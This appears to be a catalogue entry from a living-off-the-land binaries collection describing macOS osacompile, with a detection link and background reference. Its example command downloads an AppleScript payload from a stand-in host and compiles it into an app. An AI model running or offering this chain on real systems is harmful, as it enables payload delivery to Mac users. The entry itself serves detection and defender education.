---
trust_level: community
id: macos-command-and-control-osacompile
namespace: macos:commandandcontrol:osacompile
name: osacompile
description: Compile AppleScripts or OSA language scripts.
author: Brendan Chamberlain (@infosecB)
version: "1.0.0"
capabilities:
  - network.commandandcontrol
  - resource.development
platforms:
  - macos
techniques:
  - command-and-control
  - recon
execution:
  template: "osacompile"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "Download and compile a payload: The following command downloads an applescript payload from getpayload.com and compiles it into an app."
    command: "curl https://getpayload.com/payload_code.apple_script && osacompile -x -e payload_code.apple_script -o payload.app"
install:
  - method: custom
    commands:
      - "/usr/bin/osacompile"
detections:
  - type: sigma
    url: "https://github.com/SigmaHQ/sigma/pull/4127/commits/f4b0264a83e5f47473029e26dc0879fb196a7d07"
    description: "Sigma: In-Memory Download And Compile Of Payloads (experimental/pending)"
references:
  - label: "A bundle of nerves: Tweaking macOS security controls to thwart application bundle manipulation"
    url: "https://redcanary.com/blog/mac-application-bundles/"
---

osacompile is a utility used to compile scripts into executables. It's a component of Open Scripting Architecture (OSA) that Apple uses for its scripting languages, like AppleScript and JavaScript for Automation (JXA). osacompile accepts AppleScript code as input and produces a compiled script file, which can be either a script file (.scpt), an app (.app), a droplet, or a script bundle.